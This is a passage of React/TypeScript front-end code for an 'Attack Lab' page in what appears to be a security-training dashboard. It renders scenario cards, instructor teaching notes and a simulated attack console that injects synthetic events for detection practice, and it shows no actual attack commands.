        <div className="flex items-center gap-3">
          <Terminal className="h-4 w-4 text-cyan-400" />
          <span className="font-mono text-sm font-semibold text-cyan-300">
            {scenario.name}
          </span>
          {!done ? (
            <span className="flex items-center gap-1.5">
              <span className="h-1.5 w-1.5 animate-pulse rounded-full bg-red-500" />
              <span className="font-mono text-[10px] uppercase tracking-widest text-red-400">live</span>
            </span>
          ) : (
            <span className="flex items-center gap-1.5 text-green-400">
              <CheckCircle2 className="h-3 w-3" />
              <span className="font-mono text-[10px] uppercase tracking-widest">complete</span>
            </span>
          )}
        </div>

        <div className="flex items-center gap-1.5">
          {phases.map((phase, i) => (
            <span
              key={phase}
              className={cn(
                "rounded px-2 py-0.5 font-mono text-[10px] transition-colors",
                done
                  ? "bg-green-500/10 text-green-500"
                  : i === phaseIndex
                    ? "bg-cyan-500/20 text-cyan-300"
                    : i < phaseIndex
                      ? "bg-green-500/10 text-green-600"
                      : "bg-white/4 text-white/20",
              )}
            >
              {phase}
            </span>
          ))}
        </div>

        <Button variant="ghost" size="sm" className="h-7 w-7 p-0 text-white/40 hover:text-white" onClick={onClose}>
          <X className="h-4 w-4" />
        </Button>
      </div>

      {/* Progress bar */}
      <div className="h-px shrink-0 bg-white/5">
        <motion.div
          className="h-full bg-gradient-to-r from-cyan-500 to-violet-500"
          animate={{ width: `${progress * 100}%` }}
          transition={{ ease: "linear" }}
        />
      </div>

      {/* Terminal */}
      <div
        ref={termRef}
        className="flex-1 overflow-y-auto px-6 py-4 font-mono text-xs leading-relaxed"
      >
        <div className="mb-3 text-center font-mono text-[10px] text-white/10">
          ─── CYBERGUARD AI · ATTACK SIMULATION · EDUCATIONAL MODE ───
        </div>

        <AnimatePresence initial={false}>
          {lines.map(({ line, ts }, i) => (
            <motion.div
              key={i}
              initial={{ opacity: 0, x: -4 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ duration: 0.12 }}
              className={cn("mb-0.5 flex gap-2", LINE_COLORS[line.type])}
            >
              {line.type !== "phase" && line.type !== "dim" && (
                <span className="shrink-0 select-none text-white/20">[{ts}]</span>
              )}
              {line.type === "phase" || line.type === "dim" ? (
                <span>{line.text}</span>
              ) : line.type === "command" ? (
                <span>
                  <span className="text-green-600">root@attacker</span>
                  <span className="text-white/60">:</span>
                  <span className="text-blue-400/80">~</span>
                  <span className="text-white/60">$ </span>
                  <span className="text-cyan-200">{line.text}</span>
                </span>
              ) : (
                <span>{line.text}</span>
              )}
            </motion.div>
          ))}
        </AnimatePresence>

        {!done && (
          <motion.span
            animate={{ opacity: [1, 0] }}
            transition={{ duration: 0.6, repeat: Infinity, repeatType: "reverse" }}
            className="inline-block h-3 w-1.5 bg-cyan-400"
          />
        )}
      </div>

      {/* Footer */}
      <div className="flex shrink-0 items-center justify-between border-t border-white/8 bg-white/3 px-5 py-2.5">
        <div className="flex items-center gap-5 font-mono text-[11px] text-white/30">
          <span>
            events injected:{" "}
            <span className="text-cyan-400">{result?.events_ingested ?? "…"}</span>
          </span>
          <span>
            target:{" "}
            <span className="text-white/50">10.0.50.10 (synthetic)</span>
          </span>
          <span>
            scenario:{" "}
            <span className="text-white/50">{scenario.id}</span>
          </span>
        </div>

        {done && (
          <div className="flex gap-2">
            <Link
              href="/alerts"
              className={cn(buttonVariants({ variant: "outline", size: "sm" }), "h-7 border-cyan-500/30 font-mono text-[11px] text-cyan-400 hover:bg-cyan-500/10")}
            >
              View Alerts →
            </Link>
            <Link
              href="/incidents"
              className={cn(buttonVariants({ variant: "outline", size: "sm" }), "h-7 border-green-500/30 font-mono text-[11px] text-green-400 hover:bg-green-500/10")}
            >
              View Incidents →
            </Link>
          </div>
        )}
      </div>
    </motion.div>
  );
}

export default function AttackLabPage() {
  const [activeScenario, setActiveScenario] = useState<ScenarioMeta | null>(null);
  const [apiResult, setApiResult] = useState<RunResult | null>(null);
  const [launchedTimes, setLaunchedTimes] = useState<Map<string, Date>>(new Map());
  const [expandedDocId, setExpandedDocId] = useState<string | null>(null);

  const launch = useMutation({
    mutationFn: (scenarioId: string) =>
      apiFetch<RunResult>(`/scenarios/${scenarioId}/run`, { method: "POST" }),
    onSuccess: (result) => setApiResult(result),
    onError: (e: Error) => {
      toast.error(e.message);
      setActiveScenario(null);
    },
  });

  const handleLaunch = (scenario: ScenarioMeta) => {
    setActiveScenario(scenario);
    setApiResult(null);
    launch.mutate(scenario.id);
  };

  const handleClose = () => {
    if (activeScenario) {
      setLaunchedTimes((prev) => new Map([...prev, [activeScenario.id, new Date()]]));
    }
    setActiveScenario(null);
    setApiResult(null);
  };

  return (
    <div className="mx-auto max-w-6xl space-y-6">
      <div>
        <h1 className="text-2xl font-semibold">Attack Lab</h1>
        <p className="text-sm text-muted-foreground">
          Launch realistic cyberattack scenarios and watch the detection engine respond in real-time.
        </p>
      </div>

      <div className="flex items-center gap-2 rounded-lg border border-amber-500/20 bg-amber-500/10 px-4 py-3">
        <AlertTriangle className="h-4 w-4 shrink-0 text-amber-400" />
        <p className="text-xs text-amber-300">
          Educational environment — all scenarios use RFC 5737 documentation IPs and inject synthetic events only. No real systems are affected.
        </p>
      </div>

      <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
        {STATIC_SCENARIOS.map((scenario) => {
          const Icon = SCENARIO_ICONS[scenario.id] ?? FlaskConical;
          const iconColor = ICON_COLORS[scenario.id] ?? "text-cyan-400";
          const isActive = activeScenario?.id === scenario.id;
          const lastRun = launchedTimes.get(scenario.id);
          const hasLaunched = !!lastRun;
          const doc = SCENARIO_DOCS[scenario.id];
          const docsOpen = expandedDocId === scenario.id;

          return (
            <motion.div
              key={scenario.id}
              animate={isActive ? { scale: 1.02 } : { scale: 1 }}
              transition={{ duration: 0.2 }}
            >
              <Card
                className={cn(
                  "flex h-full flex-col border-border/60 bg-card/40 transition-all duration-300",
                  isActive && "ring-2 ring-cyan-500/50 shadow-lg shadow-cyan-500/10",
                  hasLaunched && !isActive && "ring-1 ring-green-500/20",
                )}
              >
                <CardHeader className="pb-3">
                  <div className="mb-2 flex items-center gap-3">
                    <div
                      className={cn(
                        "flex h-9 w-9 items-center justify-center rounded-lg bg-muted/60 transition-all",
                        isActive && "bg-cyan-500/15",
                      )}
                    >
                      {isActive ? (
                        <motion.div
                          animate={{ rotate: 360 }}
                          transition={{ duration: 2, repeat: Infinity, ease: "linear" }}
                        >
                          <Icon className={`h-5 w-5 ${iconColor}`} />
                        </motion.div>
                      ) : (
                        <Icon className={`h-5 w-5 ${iconColor}`} />
                      )}
                    </div>
                    <Badge
                      className={cn(
                        "border text-[10px] font-medium uppercase tracking-wide",
                        SEVERITY_CLASSES[scenario.severity] ?? "",
                      )}
                    >
                      {scenario.severity}
                    </Badge>
                    {isActive && (
                      <span className="flex items-center gap-1">
                        <span className="h-1.5 w-1.5 animate-pulse rounded-full bg-red-500" />
                        <span className="font-mono text-[10px] uppercase text-red-400">live</span>
                      </span>
                    )}
                    {hasLaunched && !isActive && (
                      <span className="flex items-center gap-1 text-green-500">
                        <CheckCircle2 className="h-3 w-3" />
                        <span className="font-mono text-[10px]">
                          {lastRun!.toLocaleTimeString("en-GB", { hour12: false })}
                        </span>
                      </span>
                    )}
                  </div>
                  <CardTitle className="text-sm font-semibold leading-snug">
                    {scenario.name}
                  </CardTitle>
                  <CardDescription className="line-clamp-2 text-xs">
                    {scenario.description}
                  </CardDescription>
                </CardHeader>
                <CardContent className="flex flex-1 flex-col gap-3">
                  <div className="flex flex-wrap gap-1">
                    {scenario.mitre_techniques.map((t) => (
                      <Tooltip key={t}>
                        <TooltipTrigger
                          render={
                            <button
                              className="rounded border border-cyan-500/20 bg-cyan-500/10 px-1.5 py-0.5 font-mono text-[10px] text-cyan-400"
                            >
                              {t}
                            </button>
                          }
                        />
                        <TooltipContent className="max-w-sm text-[11px]">
                          {MITRE_EXPLANATIONS[t] ?? "MITRE ATT&CK technique mapping."}
                        </TooltipContent>
                      </Tooltip>
                    ))}
                  </div>
                  <div className="flex flex-wrap gap-1">
                    {scenario.mitre_tactics.map((tac) => (
                      <span
                        key={tac}
                        className="rounded border border-border/40 bg-muted/30 px-1.5 py-0.5 text-[10px] text-muted-foreground"
                      >
                        {tac}
                      </span>
                    ))}
                  </div>
                  <p className="text-[11px] italic text-muted-foreground">{scenario.threat_actor}</p>
                  <Button
                    variant="ghost"
                    size="sm"
                    className="h-7 justify-start px-2 text-[11px] text-cyan-400 hover:bg-cyan-500/10 hover:text-cyan-300"
                    onClick={() => setExpandedDocId(docsOpen ? null : scenario.id)}
                  >
                    <BookText className="mr-1.5 h-3.5 w-3.5" />
                    {docsOpen ? "Hide teaching notes" : "Show teaching notes"}
                    <Tooltip>
                      <TooltipTrigger
                        render={
                          <span className="ml-1 inline-flex">
                            <Info className="h-3.5 w-3.5 text-muted-foreground" />
                          </span>
                        }
                      />
                      <TooltipContent className="max-w-sm text-[11px]">
                        Instructor guide: attack flow, lab command examples, and what analysts should verify.
                      </TooltipContent>
                    </Tooltip>
                  </Button>
                  {docsOpen && doc && (
                    <div className="space-y-2 rounded-md border border-cyan-500/20 bg-cyan-500/5 p-2">
                      <p className="text-[11px] text-cyan-100">
                        <span className="font-semibold text-cyan-300">Objective:</span> {doc.objective}
                      </p>
                      <p className="text-[11px] font-semibold text-cyan-300">Flow</p>
                      <div className="flex flex-wrap gap-1">
                        {doc.attack_flow.map((step) => (
                          <span
                            key={step}
                            className="rounded border border-border/50 bg-muted/40 px-1.5 py-0.5 text-[10px] text-muted-foreground"
                          >
                            {step}
                          </span>
                        ))}
                      </div>
                      <p className="text-[11px] font-semibold text-cyan-300">Lab command examples</p>
                      <div className="space-y-1">
                        {doc.lab_commands.map((command) => (
                          <p
                            key={command}
                            className="rounded bg-black/40 px-2 py-1 font-mono text-[10px] text-cyan-200"
                          >
                            {command}
                          </p>
                        ))}
                      </div>
                      <p className="text-[11px] font-semibold text-cyan-300">Detection focus</p>
                      <div className="space-y-0.5">
                        {doc.detection_focus.map((focus) => (
                          <p key={focus} className="text-[10px] text-muted-foreground">
                            - {focus}
                          </p>
                        ))}
                      </div>
                      <p className="text-[11px] font-semibold text-cyan-300">Teaching tips</p>
                      <div className="space-y-0.5">
                        {doc.teaching_tips.map((tip) => (
                          <p key={tip} className="text-[10px] text-muted-foreground">
                            - {tip}
                          </p>
                        ))}
                      </div>
                    </div>
                  )}
                  <div className="mt-auto pt-1">
                    <Button
                      variant="outline"
                      size="sm"
                      className={cn(
                        "w-full border-border/60 transition-colors",
                        isActive
                          ? "border-cyan-500/40 bg-cyan-500/10 text-cyan-400"
                          : "hover:border-cyan-500/40 hover:bg-cyan-500/10 hover:text-cyan-400",
                      )}
                      disabled={activeScenario !== null}
                      onClick={() => handleLaunch(scenario)}
                    >
                      {isActive ? (
                        <span className="flex items-center gap-2">
                          <motion.span
                            animate={{ opacity: [1, 0.3] }}
                            transition={{ duration: 0.8, repeat: Infinity, repeatType: "reverse" }}
                          >
                            ●
                          </motion.span>
                          Running…
                        </span>
                      ) : hasLaunched ? (
                        "Launch Again"
                      ) : (
                        "Launch Attack"
                      )}
                    </Button>
                  </div>
                </CardContent>
              </Card>
            </motion.div>
          );
        })}
      </div>

      <AnimatePresence>
        {activeScenario && (
          <AttackConsoleModal
            scenario={activeScenario}
            result={apiResult}
            onClose={handleClose}
          />
        )}
      </AnimatePresence>
    </div>
  );
}
